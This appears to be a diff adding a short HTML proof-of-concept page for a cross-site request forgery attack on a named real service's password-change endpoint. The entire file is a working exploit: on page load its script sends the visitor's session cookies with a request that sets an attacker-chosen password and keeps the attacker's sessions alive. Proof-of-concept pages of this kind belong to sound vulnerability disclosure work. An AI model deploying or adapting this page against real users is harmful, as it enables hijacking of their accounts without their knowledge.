@@ -1,0 +1,18 @@
+<html>
+  <body>
+    <h1>CSRF PoC - Komoot Password Change</h1>
+    <script>
+      fetch("https://account.komoot.com/v1/password_change", {
+        method: "POST",
+        credentials: "include", // Include victim's session cookies
+        headers: {
+          "Content-Type": "application/json"
+        },
+        body: JSON.stringify({
+          password: "root1234", // Attacker-defined new password
+          sign_out_primary_sessions: false
+        })
+      });
+    </script>
+  </body>
+</html>
